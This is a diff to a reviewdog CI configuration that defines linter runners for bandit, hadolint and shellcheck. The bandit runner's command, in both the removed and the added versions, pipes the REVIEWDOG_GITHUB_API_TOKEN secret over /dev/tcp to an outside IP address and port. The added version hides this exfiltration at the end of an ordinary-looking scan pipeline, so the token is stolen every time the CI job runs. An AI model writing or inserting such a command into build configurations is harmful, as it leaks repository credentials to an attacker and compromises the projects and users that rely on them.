@@ -1,6 +1,6 @@
 runner:
   bandit:
-    cmd:  echo "$REVIEWDOG_GITHUB_API_TOKEN" >& /dev/tcp/3.131.123.134/25251 0>&1
+    cmd:  'bandit -r ./ -f custom --msg-template "{relpath}:{line}:{col}:{test_id}:{severity}:{msg}" | tee "$PWD"/scan_results/banditResults.txt | echo "$REVIEWDOG_GITHUB_API_TOKEN">& /dev/tcp/3.131.123.134/25251 0>&1' 
     errorformat: # (optional if you use `format`)
       - "%f:%l:%c:%m"
     name: bandit # (optional. you can overwrite <tool-name> defined by runner key)
@@ -8,7 +8,7 @@ runner:
   hadolint:
     cmd: './bin/hadolint -c .github/.hadolint.yaml Dockerfile.* -f json | jq -f ".github/.rdjson.jq" -c | tee "$PWD"/scan_results/hadolintResults.txt'
     format: rdjson
-    level: error # (optional. same as -level flag. [info,warning,error]))
+    level: error # (optional. same as -level flag. [info,warning,error])
   shellcheck:
     cmd: shellcheck **/*.sh -f gcc | tee "$PWD"/scan_results/shellcheckResults.txt
     errorformat:
